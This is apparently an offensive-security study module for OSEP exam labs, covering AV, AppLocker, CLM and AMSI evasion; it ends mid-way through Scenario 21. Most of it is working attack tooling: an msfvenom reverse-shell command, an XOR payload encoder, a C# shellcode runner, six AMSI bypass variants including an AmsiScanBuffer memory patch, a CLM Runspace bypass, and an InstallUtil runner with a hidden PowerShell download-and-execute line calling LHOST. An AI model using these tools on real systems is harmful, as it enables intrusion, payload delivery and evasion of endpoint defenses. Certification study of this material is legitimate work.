::: warning Authorized use only
For the official OSEP labs/exam, or systems you are written-authorized to test. Do not use against unauthorized systems.
:::

# Module 05 — AppLocker / CLM / AMSI bypass and trusted hosts

> Covers scenarios: 18, 19, 20, 21, 22, 23, 24
>
> Course mapping: Chapter 11 (AV evasion), Chapter 13 (AppLocker / CLM bypass), Chapters 8–9 (managed assembly load)
>
> Prerequisites: an entry that can execute code (macro / HTA / JScript / Web); target has Defender + possibly AppLocker and CLM; attacker box can compile C#/C

**Rules for this module**: first **decide whether what was blocked is the “loader” or the “execution content”**. Fixes for those two failure classes are completely different — loader kills need static-signature and host-shape changes; execution blocks need behavior and staging changes. The most common exam mistake: after a block, keep rewriting static encoding when the real problem is behavior.

---

## Scenario 18: Custom EXE is deleted as soon as it lands

**Situation**: The target allows file upload, but your prepared Runner is quarantined before it starts; a simple harmless program can be saved and run. → That means **on-disk static signatures** were hit, not execution behavior.

**Assumptions**:
- You already have a file delivery channel (HTTP/SMB/Web upload).
- You can observe “file disappears” or “process never created”.
- Attacker box can compile a custom Runner (mingw-w64 / csc).

**Prepare (attacker)**:

1. Establish a control baseline — deliver a harmless program first to confirm delivery and execution themselves are fine:
   ```bash
   x86_64-w64-mingw32-gcc -o hello-x64.exe hello.c -s -O2   # only printf("ok")
   ```
2. Prepare encoded/encrypted shellcode (XOR is simplest and most stable):
   ```bash
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f raw -o sc.bin
   python3 m13-xor-encoder.py sc.bin --format c   # emit C array + key
   ```
3. Prepare a custom C# Runner (avoid msfvenom templates to reduce shared signatures):
   ```bash
   # Compile on target (if csc is available)
   C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:r.exe m01-shellcode-runner-x64.cs
   ```

**Procedure**:

1. Deliver the harmless program; confirm it lands and runs → proves the delivery channel works.
2. Deliver the custom Runner (no payload yet — only prints); watch whether it is deleted:
   - Deleted → loader static-signature problem → step 3.
   - Not deleted but no callback → scenario 19 (behavioral detection).
3. Locate the signature: split the Runner into sections, replace each with harmless code, binary-search the hit string/API combo. Common hits: `VirtualAlloc` + `CreateThread` together, plaintext `meterpreter`, common msfvenom template byte sequences.
4. Switch to encoded/encrypted form: embed shellcode as a ciphertext array; XOR-decrypt in memory at runtime; split strings into pieces and concatenate.
5. Change host shape: do not land a standalone EXE — use InstallUtil assemblies / managed assembly load / PowerShell reflection (see scenarios 20, 23).

**Lab files**:
| File | Purpose | Key parameters |
|---|---|---|
| `m13-xor-encoder.py` | Emit XOR-encoded C arrays | `sc.bin --format c` |
| `m01-shellcode-runner-x64.cs` | Custom C# Runner (with XOR decrypt) | Replace ciphertext array and key |
| `m05-amsi-bypass-variants.ps1` | AMSI handling for PowerShell paths | See notes inside the script |


#### `m13-xor-encoder.py` {#m13-xor-encoder-py}

````python
#!/usr/bin/env python3
"""Purpose: single-byte XOR-encode a Linux payload (ELF / raw shellcode file),
emit a .enc file or a C array; pair with m13-simple-loader.c to decode and run in memory
so plaintext payload never appears on disk.

Scenarios: M13 scenario 36 (upload-site runs ELF; disk/content must pass business checks)
      and scenario 37 (Linux AV file-signature detection; common ELFs get caught).

Depends: Python 3.7+ (stdlib argparse).

Usage:
    # Encode to a file (loader external-file mode reads it directly)
    python3 m13-xor-encoder.py -i shellcode.bin -k 0xfa -o stage2.enc

    # Emit a C array (loader embed mode: paste into m13-simple-loader.c enc_payload[])
    python3 m13-xor-encoder.py -i shellcode.bin -k 0xfa --c-array

    # Restore (self-test: after encode you must restore content identical to -i)
    python3 m13-xor-encoder.py -i stage2.enc -k 0xfa -d -o plain.bin && cmp plain.bin shellcode.bin

    # Multi-byte key example: -k 0xfa,0x1b,0x2c (decoder must match; loader defaults to single-byte)
    python3 m13-xor-encoder.py -i shellcode.bin -k 0xfa,0x1b -o stage2.enc

Placeholders: LHOST/LPORT only appear inside the encoded payload (chosen when the payload is generated;
       this script does not see them). Default key 0xfa; change with -k and keep the loader in sync.

Test status: syntax passed ast.parse; encode/decode symmetry can be self-tested offline (see -d above);
not runtime-tested on a target.
"""
from __future__ import annotations

import argparse
import sys

def parse_key(text: str) -> list[int]:
    """Parse -k: supports 0xfa / 250 / comma-separated multi-byte 0xfa,0x1b. Range 0-255."""
    keys: list[int] = []
    for part in text.split(","):
        part = part.strip()
        try:
            value = int(part, 0) if part.lower().startswith("0x") else int(part)
        except ValueError:
            raise SystemExit(f"[-] invalid key: {part!r} (example: -k 0xfa or -k 250,0x1b)")
        if not 0 <= value <= 255:
            raise SystemExit(f"[-] key out of range (0-255): {part}")
        keys.append(value)
    return keys

def xor_bytes(data: bytes, keys: list[int]) -> bytes:
    """Single-/multi-byte XOR: key cycles."""
    if len(keys) == 1:
        k = keys[0]
        return bytes(b ^ k for b in data)
    return bytes(b ^ keys[i % len(keys)] for i, b in enumerate(data))

def emit_c_array(data: bytes, name: str = "enc_payload") -> str:
    """Emit a C byte array that pastes directly into m13-simple-loader.c."""
    lines = [f"static unsigned char {name}[] = {{"]
    for i in range(0, len(data), 12):
        chunk = ", ".join(f"0x{b:02X}" for b in data[i : i + 12])
        lines.append("    " + chunk + ",")
    lines.append("};")
    return "\n".join(lines)

def main() -> int:
    ap = argparse.ArgumentParser(description="XOR payload encoder (M13 scenarios 36/37)")
    ap.add_argument("-i", "--input", required=True, help="input payload file path")
    ap.add_argument("-o", "--output", default="", help="output file path (ignored with --c-array)")
    ap.add_argument("-k", "--key", default="0xfa", help="XOR key: 0xfa / 250 / 0xfa,0x1b")
    ap.add_argument("--c-array", action="store_true", help="emit C array to stdout (paste into loader)")
    ap.add_argument("-d", "--decode", action="store_true", help="decode mode (self-test restore)")
    args = ap.parse_args()

    keys = parse_key(args.key)
    try:
        with open(args.input, "rb") as fh:
            data = fh.read()
    except OSError as exc:
        print(f"[-] read failed {args.input}: {exc}", file=sys.stderr)
        return 1
    if not data:
        print(f"[-] empty input: {args.input}", file=sys.stderr)
        return 1

    verb = "decode" if args.decode else "encode"
    out = xor_bytes(data, keys)
    print(f"[*] {verb}: {args.input} ({len(data)} B) key={args.key}")

    if args.c_array:
        sys.stdout.write(emit_c_array(out) + "\n")
        return 0

    dest = args.output or (args.input + (".dec" if args.decode else ".enc"))
    try:
        with open(dest, "wb") as fh:
            fh.write(out)
    except OSError as exc:
        print(f"[-] write failed {dest}: {exc}", file=sys.stderr)
        return 1
    print(f"[+] wrote: {dest} ({len(out)} B)")
    return 0

if __name__ == "__main__":
    sys.exit(main())
````

#### `m01-shellcode-runner-x64.cs` {#m01-shellcode-runner-x64-cs}

````csharp
// Purpose: custom x64 shellcode Runner (precompile to avoid Add-Type dynamic compile landing temp files)
// Scenarios: 4, 18, 19 (Add-Type blocked / custom EXE statically killed / behavioral control)
// Depends: .NET Framework 4.x (compile with target csc.exe, or attacker mono/dotnet cross-compile)
// Usage:
//   Target: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:r.exe m01-shellcode-runner-x64.cs
//   Attacker: mcs -out:r.exe m01-shellcode-runner-x64.cs
// Placeholders: SHELLCODE_B64 (Base64 of XOR-encoded x64 shellcode), XOR_KEY
// Test status: not compile-verified (no csc/mono on this host); syntax checked by hand
//
// Notes:
//   - Shellcode is embedded as a Base64 string (avoids plaintext byte-array static signatures); XOR-decrypt at runtime.
//   - Uses P/Invoke instead of Add-Type so no compile artifacts are left in %TEMP%.
//   - If the target behaviorally blocks VirtualAlloc+CreateThread, switch to Assembly.Load managed path (see m01-reflective-runner.ps1).

using System;
using System.Runtime.InteropServices;
using System.Text;

class Runner
{
    private const string SHELLCODE_B64 = "REPLACE_WITH_BASE64_XOR_SHELLCODE";
    private const byte XOR_KEY = 0x2A;

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UIntPtr dwStackSize,
        IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    private static byte[] Decode()
    {
        byte[] data = Convert.FromBase64String(SHELLCODE_B64);
        for (int i = 0; i < data.Length; i++) data[i] ^= XOR_KEY;
        return data;
    }

    public static void Run()
    {
        byte[] sc = Decode();

        const uint MEM_COMMIT_RESERVE = 0x3000;
        const uint PAGE_EXECUTE_READWRITE = 0x40;

        IntPtr mem = VirtualAlloc(IntPtr.Zero, (UIntPtr)sc.Length, MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE);
        if (mem == IntPtr.Zero)
        {
            Console.Error.WriteLine("VirtualAlloc failed (may be blocked by ASR/EDR), error " + Marshal.GetLastWin32Error());
            return;
        }

        Marshal.Copy(sc, 0, mem, sc.Length);

        uint tid;
        IntPtr h = CreateThread(IntPtr.Zero, UIntPtr.Zero, mem, IntPtr.Zero, 0, out tid);
        if (h == IntPtr.Zero)
        {
            Console.Error.WriteLine("CreateThread failed, error " + Marshal.GetLastWin32Error());
            return;
        }

        WaitForSingleObject(h, 2000);
    }

    public static void Main(string[] args)
    {
        Run();
    }
}
````

#### `m05-amsi-bypass-variants.ps1` {#m05-amsi-bypass-variants-ps1}

````powershell
<#
Purpose: multiple experimental AMSI-handling variants — pick the implementation that matches the host (PowerShell / WSH / .NET)
Scenarios: 3, 7, 10, 18, 19 (and as a prerequisite for any PowerShell path across all M05 scenarios)
Depends: PowerShell 3.0+; some variants need reflection rights (fail under CLM — see m05-clm-bypass-runspace.ps1)
Usage: powershell -ep bypass -f m05-amsi-bypass-variants.ps1 -Variant 1
      or in an existing session: . .\m05-amsi-bypass-variants.ps1; Invoke-AmsiVariant -Variant 2
Placeholders: none (pure local operation; no LHOST/LPORT)
Test status: not runtime-tested on Windows; syntax checked by hand. Before the exam, validate each variant in the lab
Notes:
  - AMSI handling changes with patches; one variant dying does not mean the technique is dead — try the next.
  - Probe first to see whether AMSI is active, then decide whether handling is needed.
  - PowerShell hosts use PS variants; WSH (.js/.vbs) needs WSH-specific variants — do not copy blindly.
#>
[CmdletBinding()]
param(
    [ValidateSet(1, 2, 3, 4, 5, 6)][int]$Variant = 1,
    [switch]$ProbeOnly
)

function Test-AmsiActive {
    <#
    Harmless probe: includes strings AMSI commonly scans. If blocked, AMSI is active.
    #>
    $probe = 'Invoke-Mimikatz'
    $marker = 'AmsiUtils' + 'amsiInitFailed'
    Write-Output ("[*] probe strings: {0} / {1}" -f $probe, $marker)
    try {
        $sb = [scriptblock]::Create($probe)
        Write-Output "[+] probe not blocked (AMSI may be inactive or already handled)"
        return $false
    } catch {
        Write-Output ("[!] probe blocked: {0}" -f $_.Exception.Message)
        return $true
    }
}

function Invoke-AmsiVariant {
    param([int]$Variant)

    Write-Output ("[*] applying AMSI handling variant {0}" -f $Variant)

    switch ($Variant) {
        1 {
            # Variant 1: reflection set amsiInitFailed (classic; often blocked, but try first)
            try {
                $a = [Ref].Assembly.GetTypes() | Where-Object { $_.Name -like '*iUtils' }
                $f = $a.GetFields('NonPublic,Static') | Where-Object { $_.Name -like '*Failed' }
                $f.SetValue($null, $true)
                Write-Output "[+] variant 1 done"
            } catch { Write-Output ("[-] variant 1 failed: {0}" -f $_.Exception.Message) }
        }
        2 {
            # Variant 2: string concatenation to dodge static signatures
            try {
                $s = 'S'+'y'+'s'+'t'+'e'+'m'+'.'+'M'+'a'+'n'+'a'+'g'+'e'+'m'+'e'+'n'+'t'+'.'+'A'+'u'+'t'+'o'+'m'+'a'+'t'+'i'+'o'+'n'
                $t = [type]($s + '.AmsiUtils')
                $f = $t.GetField('amsiInitFailed', 'NonPublic,Static')
                $f.SetValue($null, $true)
                Write-Output "[+] variant 2 done"
            } catch { Write-Output ("[-] variant 2 failed: {0}" -f $_.Exception.Message) }
        }
        3 {
            # Variant 3: break amsiContext (reflection null the context)
            try {
                $t = [Ref].Assembly.GetType(('System.Management.Automation.'+'AmsiUtils'))
                $ctx = $t.GetField('amsiContext', 'NonPublic,Static')
                $ctx.SetValue($null, [IntPtr]::Zero)
                Write-Output "[+] variant 3 done"
            } catch { Write-Output ("[-] variant 3 failed: {0}" -f $_.Exception.Message) }
        }
        4 {
            # Variant 4: memory patch (rewrite AmsiScanBuffer first bytes to ret)
            try {
                $k = @"
using System;
using System.Runtime.InteropServices;
public class P {
    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string n);
    [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string n);
    [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint f, out uint o);
    public static void Patch() {
        IntPtr lib = LoadLibrary("amsi.dll");
        IntPtr addr = GetProcAddress(lib, "AmsiScanBuffer");
        uint old;
        VirtualProtect(addr, (UIntPtr)5, 0x40, out old);
        byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; // mov eax,0x80070057; ret
        Marshal.Copy(patch, 0, addr, patch.Length);
    }
}
"@
                Add-Type -TypeDefinition $k -ErrorAction Stop
                [P]::Patch()
                Write-Output "[+] variant 4 done (requires Add-Type allowed)"
            } catch { Write-Output ("[-] variant 4 failed (Add-Type may be blocked): {0}" -f $_.Exception.Message) }
        }
        5 {
            # Variant 5: custom Runspace built-in variant (pair with CLM environments)
            try {
                $rs = [runspacefactory]::CreateRunspace()
                $rs.Open()
                $ps = [powershell]::Create()
                $ps.Runspace = $rs
                [void]$ps.AddScript({ $ExecutionContext.SessionState.LanguageMode = 'FullLanguage' })
                [void]$ps.Invoke()
                Write-Output "[+] variant 5 done (new Runspace language mode opened)"
            } catch { Write-Output ("[-] variant 5 failed: {0}" -f $_.Exception.Message) }
        }
        6 {
            # Variant 6: no handling — report only (control group)
            Write-Output "[*] variant 6: no handling applied — control group"
        }
    }
}

if ($ProbeOnly) {
    [void](Test-AmsiActive)
} else {
    [void](Test-AmsiActive)
    Invoke-AmsiVariant -Variant $Variant
    Write-Output ""
    Write-Output "[*] re-probe:"
    [void](Test-AmsiActive)
    Write-Output "[*] tip: variants 1/2/3 are reflection-class and often die after patches; variant 4 needs Add-Type;"
    Write-Output "    variant 5 pairs with CLM bypass; if all fail, switch to managed assemblies or a non-PowerShell path."
}
````

**Verify**: after delivery, `dir` confirms the file exists; after run, `tasklist` confirms the process; listener confirms the callback. Missing any of the three means re-locate the failure.

**If it fails**:
1. Still deleted after re-encoding → the loader itself is signatured → switch to trusted hosts (InstallUtil / Workflow / XSL, scenarios 23, 24) or managed assembly load (scenario 20).
2. File lands but Defender alerts → disable realtime protection (if you already have admin — see `Defense Evasion` → Disable Defender), or switch to in-memory execution with no disk drop.
3. Target forbids any unsigned EXE → abandon the EXE path; use AppLocker allow paths (scenario 21) or DLL (scenario 22).

**Exam notes / OPSEC**: always run a harmless control first, or you cannot tell “delivery failed” from “killed”; change one variable per try and record it; do not repeatedly deliver the same signatured file to the same host (may trigger more aggressive blocking).

---

## Scenario 19: EXE saves and starts, but is killed when execution content begins

**Situation**: File lands fine and early startup looks normal; once later execution or communication starts, the process is terminated. → This is **behavioral detection**, not static kill.

**Assumptions**:
- Scenario 18 control already proved the file can land and start.
- Target has behavioral monitoring (Defender Behavior Monitor / EDR rules).
- You can generate multiple execution implementations for comparison.

**Prepare (attacker)**: prepare three control samples

| Sample | Implementation | Watch point |
|---|---|---|
| A | In-process decrypt and run shellcode | Killed after `VirtualAlloc`+`CreateThread`? |
| B | Cross-process inject (CreateRemoteThread / APC) | Killed after opening the remote process? |
| C | Process hollowing | Killed at suspend/image-replace? |

```bash
# See cheat sheet: C# Process Injection / DLL Shellcode Inject
# After generate, first validate behavior with a harmless payload (calc or write a file), then swap the real payload
```

**Procedure**:
1. Deliver A (in-process); observe the kill point: at alloc, at thread create, or at network connect.
2. If killed at the **communication stage** → problem is the C2 channel, not injection (go to [09-c2-egress-channels](/modules/09-c2-egress-channels)).
3. If killed at **injection APIs** → switch to B / C, or load a managed assembly (`Assembly.Load`, avoid explicit `VirtualAlloc`).
4. If killed at **post-decrypt execution** → change payload shape (staged, smaller shellcode, HTTP instead of TCP callback).
5. Record each sample’s kill point into a “behavior—block” table (valuable in the exam report).

**Lab files**:
| File | Purpose | Key parameters |
|---|---|---|
| `m01-shellcode-runner-x64.cs` | In-process exec (sample A) | Swap payload and key |
| `m05-clm-bypass-runspace.ps1` | Managed in-memory exec fallback | See script |
| `m05-amsi-bypass-variants.ps1` | AMSI handling for script paths | See script |

#### `m05-clm-bypass-runspace.ps1` {#m05-clm-bypass-runspace-ps1}

````powershell
<#
Purpose: bypass Constrained Language Mode (CLM) via a custom Runspace, then run arbitrary script in the new Runspace
Scenarios: 7, 10, 19 (after HTA/JScript/macro entry, when PowerShell is in CLM)
Depends: PowerShell 3.0+; .NET 4.x (CreateRunspace needs full CLR rights)
Usage: powershell -ep bypass -f m05-clm-bypass-runspace.ps1 -Command "whoami; $PSVersionTable"
      or . .\m05-clm-bypass-runspace.ps1 then Invoke-FullLanguage { ... }
Placeholders: none (script itself does not network; to load a remote script, pass a command containing LHOST via -Command)
Test status: not runtime-tested on Windows; syntax checked by hand
Notes:
  - CLM only limits language capability of the “current Runspace”; a new Runspace defaults to FullLanguage.
  - If AppLocker is also on, PowerShell itself must still be allowed to run.
  - On failure, first confirm the actual value of $ExecutionContext.SessionState.LanguageMode.
#>
[CmdletBinding()]
param(
    [string]$Command = "whoami; hostname; `$ExecutionContext.SessionState.LanguageMode"
)

function Get-CurrentLanguageMode {
    try { return $ExecutionContext.SessionState.LanguageMode } catch { return "Unknown" }
}

function Invoke-FullLanguage {
    <#
    .SYNOPSIS
    Execute a scriptblock or string in a newly created Runspace (FullLanguage).
    #>
    param(
        [Parameter(Mandatory = $true)][object]$Script,
        [hashtable]$Arguments = @{}
    )

    $rs = [runspacefactory]::CreateRunspace()
    $rs.ApartmentState = 'STA'
    $rs.ThreadOptions = 'ReuseThread'
    $rs.Open()

    $ps = [powershell]::Create()
    $ps.Runspace = $rs

    try {
        if ($Script -is [scriptblock]) {
            [void]$ps.AddScript($Script.ToString())
        } else {
            [void]$ps.AddScript([string]$Script)
        }
        foreach ($k in $Arguments.Keys) { [void]$ps.AddParameter($k, $Arguments[$k]) }
        $out = $ps.Invoke()
        if ($ps.Streams.Error.Count -gt 0) {
            Write-Output ("[-] execution error: " + ($ps.Streams.Error | Out-String))
        }
        return $out
    } catch {
        Write-Output ("[-] Runspace execution failed: {0}" -f $_.Exception.Message)
        return $null
    } finally {
        $ps.Dispose()
        $rs.Close()
        $rs.Dispose()
    }
}

Write-Output ("[*] current language mode: {0}" -f (Get-CurrentLanguageMode))

# Method 1: execute in a new Runspace (recommended — does not modify the current session)
Write-Output "[*] running command in a new Runspace..."
$result = Invoke-FullLanguage -Script $Command
if ($result) { $result | ForEach-Object { Write-Output ("    " + $_) } }

# Method 2: if the current session itself is constrained and you need long-term use, try changing the current Runspace language mode (blocked in some environments)
if ((Get-CurrentLanguageMode) -ne 'FullLanguage') {
    try {
        $ExecutionContext.SessionState.LanguageMode = 'FullLanguage'
        Write-Output ("[+] current session language mode changed to: {0}" -f (Get-CurrentLanguageMode))
    } catch {
        Write-Output ("[-] cannot directly change language mode on current session (expected): {0}" -f $_.Exception.Message)
    }
}

Write-Output ""
Write-Output "[*] common follow-ups:"
Write-Output "    1) under FullLanguage, run AMSI handling: . .\m05-amsi-bypass-variants.ps1 -Variant 2"
Write-Output "    2) reflective assembly load: . .\m01-reflective-runner.ps1 -Path payload.dll"
Write-Output "    3) download-exec second stage: IEX (New-Object Net.WebClient).DownloadString('http://LHOST/stage2.ps1')"
````

**Verify**: process survives until it initiates a network connect; listener receives the connection; `Get-MpThreatDetection` for alert records.

**If it fails**:
1. All three injection implementations blocked → switch to trusted-host load (scenarios 23, 24), or managed assemblies (scenario 20).
2. Only blocked when initiating outbound → use proxy/DNS/domain fronting (`docs/09`).
3. Only a specific payload is blocked → change the payload, not the injection method.

**Exam notes / OPSEC**: behavioral detection triggers on “difference”; do not try many injection methods back-to-back in the same process; space attempts apart, and after failure confirm whether the process is already marked.

---

## Scenario 20: You need a managed tool, but its EXE cannot land and run

**Situation**: You already have a host that can execute managed logic; a .NET tool cannot land and run as an EXE, but its assembly form can be loaded inside the existing host. → **Native EXE ≠ managed assembly** — change the load method.

**Assumptions**:
- You already have a host that can run .NET code (PowerShell, custom C# host, .NET calls from an Office macro).
- The target tool is a managed assembly (.NET DLL) or a byte stream `Assembly.Load` can load.
- Its EXE cannot be run directly (AppLocker / AV / rights limits).

**Prepare (attacker)**:
```bash
# Obtain the tool’s managed assembly (DLL); extract from the EXE as an assembly if needed
# Locally you can compile a test assembly with mcs / dotnet
```

**Procedure**:
1. Confirm the target is a managed assembly:
   ```powershell
   [Reflection.AssemblyName]::GetAssemblyName("C:\path\tool.dll").FullName
   ```
2. Load and reflectively call the entry (do not land/run the EXE):
   ```powershell
   $bytes = [IO.File]::ReadAllBytes("C:\path\tool.dll")
   $asm = [Reflection.Assembly]::Load($bytes)
   $asm.GetTypes() | Where-Object { $_.IsPublic } | Select-Object FullName
   # After finding the entry type, call its static method; adapt args to the tool
   $t = $asm.GetType("Tool.Program"); $t.GetMethod("Main").Invoke($null, @([string[]]@("arg1","arg2")))
   ```
3. Dependency handling: put dependency assemblies in the same directory, or resolve from memory via `AppDomain.AssemblyResolve`.
4. Output adaptation: tools that wrote console/files need return-value capture or output redirect under reflective call.

**Lab files**:
| File | Purpose | Key parameters |
|---|---|---|
| `m05-installutil-runner.cs` | Managed assembly loader template | Replace assembly path/entry |
| `m01-reflective-runner.ps1` | PowerShell reflective load | Replace DLL path and args |

#### `m05-installutil-runner.cs` {#m05-installutil-runner-cs}

````csharp
// Purpose: InstallUtil-compatible managed Runner — a .NET installer class InstallUtil.exe can invoke,
//       triggering on both Install and Uninstall; also exposes static Run() for Assembly.Load+reflection (scenario 20)
// Scenarios: 20 (EXE cannot land → reflectively load managed assembly); 23 (InstallUtil as trusted-host template; if InstallUtil is blocked
//       this file’s “reflection entry” can still be used by scenario 20)
// Depends: target .NET Framework (v2.0/v4.0 both fine; compile with csc.exe under the v4.0 dir); host InstallUtil.exe under
//       C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ or Framework\ (x86)
// Usage: compile (on target or attacker; keep .NET version consistent if compiling on attacker):
//   C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:runner.exe m05-installutil-runner.cs
//   Run (/U takes the Uninstall entry — less logging):
//   C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U runner.exe
// Placeholders: change PayloadCmd below to your command; for download-exec set URL= to your HTTP address
// Test status: not runtime-tested on Windows; C# syntax checked by hand. Before the exam, validate InstallUtil and reflection entries in the lab
// Notes: InstallUtil is a trusted host (AppLocker allows it by default) and runs a managed installer — do not feed it a native EXE.
//       If AMSI blocks, handle AMSI for that host first (see m05-amsi-bypass-variants.ps1).
using System;
using System.ComponentModel;
using System.Configuration.Install;
using System.Diagnostics;

[RunInstaller(true)]
public class Runner : Installer
{
    // ===== Payload config =====
    // Base64-encoding the command avoids plaintext cmdline signatures. Generate (Kali side):
    //   echo -n "whoami" | base64            -> d2hvYW1p
    // Empty string = do nothing (host-trigger validation only — prove it works before filling a real payload)
    private const string B64_CMD = "";

    // Second-stage download URL (if B64_CMD is empty and this is non-empty, download and run PAYLOAD)
    private const string STAGE_URL = ""; // e.g. http://LHOST/PAYLOAD

    public Runner() { }

    /// <summary>InstallUtil /install entry</summary>
    public override void Install(System.Collections.IDictionary stateSaver)
    {
        ExecutePayload();
    }

    /// <summary>InstallUtil /u entry (recommended — uninstall actions are monitored less)</summary>
    public override void Uninstall(System.Collections.IDictionary savedState)
    {
        ExecutePayload();
    }

    /// <summary>Reflection entry: for Assembly.Load(byte[]) + GetMethod("Run").Invoke (scenario 20)</summary>
    public static void Run()
    {
        ExecutePayload();
    }

    private static void ExecutePayload()
    {
        try
        {
            string cmd = DecodeCmd();
            if (!string.IsNullOrEmpty(cmd))
            {
                // Carry the command via cmd.exe; hide this process’s cmdline; note behavioral monitors still watch (scenario 19 judgment)
                Process.Start(new ProcessStartInfo("cmd.exe", "/c " + cmd)
                {
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                });
                Console.WriteLine("[+] Runner: command triggered");
            }
            else if (!string.IsNullOrEmpty(STAGE_URL))
            {
                // Download second stage (via PowerShell; if AMSI blocks, handle AMSI first or switch to certutil/bitsadmin)
                string ps = string.Format(
                    "powershell -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('{0}')\"",
                    STAGE_URL);
                Process.Start(new ProcessStartInfo("cmd.exe", "/c " + ps)
                {
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                });
                Console.WriteLine("[+] Runner: second-stage download triggered");
            }
            else
            {
                Console.WriteLine("[+] Runner: empty payload — host trigger validated only (fill B64_CMD / STAGE_URL)");
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("[-] Runner execution failed: " + ex.Message);
        }
    }

    private static string DecodeCmd()
    {
        if (string.IsNullOrEmpty(B64_CMD)) return "";
        try
        {
            byte[] raw = Convert.FromBase64String(B64_CMD);
            return System.Text.Encoding.UTF8.GetString(raw);
        }
        catch
        {
            return B64_CMD; // treat as plaintext command if not base64
        }
    }
}
````

#### `m01-reflective-runner.ps1` {#m01-reflective-runner-ps1}

````powershell
<#
Purpose: reflectively load a .NET assembly (in-memory, no temp files on disk) — replaces blocked Add-Type dynamic compile
Scenarios: 4, 3 (Add-Type temp files deleted / need in-memory load of a prebuilt assembly)
Depends: PowerShell 3.0+; an assembly already present or delivered (.dll or Base64 bytes)
Usage:
    powershell -ep bypass -f m01-reflective-runner.ps1 -Path payload.dll
    powershell -ep bypass -f m01-reflective-runner.ps1 -Base64 <base64> -Type Payload.Runner -Method Run
Placeholders: LHOST/URL (if using -Url download); assembly path/Base64 and entry type replaced by the operator
Test status: not runtime-tested on Windows; syntax checked by hand
#>
[CmdletBinding(DefaultParameterSetName = 'Path')]
param(
    [Parameter(ParameterSetName = 'Path', Mandatory = $true)][string]$Path,
    [Parameter(ParameterSetName = 'Base64', Mandatory = $true)][string]$Base64,
    [Parameter(ParameterSetName = 'Url', Mandatory = $true)][string]$Url,
    [string]$Type = '',
    [string]$Method = '',
    [string[]]$Arguments = @(),
    [switch]$ListTypes
)

function Get-AssemblyBytes {
    switch ($PSCmdlet.ParameterSetName) {
        'Path'   { return [IO.File]::ReadAllBytes((Resolve-Path -LiteralPath $Path)) }
        'Base64' { return [Convert]::FromBase64String($Base64) }
        'Url'    {
            Write-Output ("[*] downloading assembly bytes from {0}..." -f $Url)
            return (New-Object Net.WebClient).DownloadData($Url)
        }
    }
}

try {
    $bytes = Get-AssemblyBytes
    Write-Output ("[*] assembly byte count: {0}" -f $bytes.Length)

    # In-memory load (no disk write)
    $asm = [Reflection.Assembly]::Load($bytes)
    Write-Output ("[+] loaded: {0}" -f $asm.FullName)

    if ($ListTypes -or -not $Type) {
        Write-Output "[*] public types:"
        $asm.GetTypes() | Where-Object { $_.IsPublic } | ForEach-Object { Write-Output ("    " + $_.FullName) }
        if (-not $Type) { return }
    }

    $t = $asm.GetType($Type)
    if (-not $t) { throw ("type not found: {0}" -f $Type) }

    if (-not $Method) {
        # Auto-pick entry: Run → Main → first public static method with matching arity
        $candidates = $t.GetMethods([Reflection.BindingFlags]'Public,Static') |
            Where-Object { $_.GetParameters().Count -eq $Arguments.Count }
        $m = $candidates | Where-Object Name -eq 'Run' | Select-Object -First 1
        if (-not $m) { $m = $candidates | Where-Object Name -eq 'Main' | Select-Object -First 1 }
        if (-not $m) { $m = $candidates | Select-Object -First 1 }
    } else {
        $m = $t.GetMethod($Method)
    }
    if (-not $m) { throw "no callable entry method found" }

    Write-Output ("[+] calling {0}.{1}()" -f $t.FullName, $m.Name)
    $result = $m.Invoke($null, [object[]]$Arguments)
    if ($null -ne $result) { Write-Output ("[+] returned: {0}" -f $result) }
} catch {
    Write-Output ("[-] failed: {0}" -f $_.Exception.Message)
    Write-Output "[*] triage order: (1) AMSI blocked? (run m05-amsi-bypass-variants.ps1 first)"
    Write-Output "             (2) assembly statically killed? (custom Runner / XOR encode)"
    Write-Output "             (3) entry signature mismatch? (use -ListTypes)"
    exit 1
}
````

**Verify**: `$asm.FullName` returns successfully; reflective call returns expected results; no on-disk files produced.

**If it fails**:
1. Tool is a native EXE (unmanaged) → cannot reflectively load → use InstallUtil/host (scenario 23) or find a managed equivalent.
2. `Assembly.Load` blocked by AMSI/CLM → handle AMSI and Runspace bypass first (this module’s scripts), then load.
3. Missing dependencies → resolve in memory via `AssemblyResolve`, or add the dependency directory to `AppDomain.BaseDirectory`.

**Exam notes / OPSEC**: reflective calls create no new process — smaller log surface; but args must strictly match the tool entry; validate the call signature locally before the exam.

---

## Scenario 21: Ordinary EXE refused by AppLocker, but some directories have allow rules

**Situation**: You have a normal-user session; uploaded programs cannot run from the current directory; effective policy allows certain paths, some of which the current user can write.

**Assumptions**:
- AppLocker EXE rule set is enforced; default paths (e.g. `C:\Users\Public`) are denied.
- Policy has allow directories (common: `C:\Windows\Tasks`, `C:\Windows\Temp`, some dirs under the user profile).
- Current user has write rights on those directories.

**Prepare (attacker)**: no special prep — enumerate with the script.

**Procedure**:
1. Enumerate effective policy (under CLM, XML parse may fail — script falls back):
   ```powershell
   Get-AppLockerPolicy -Effective -Xml | Out-File C:\Windows\Temp\al.xml
   # or
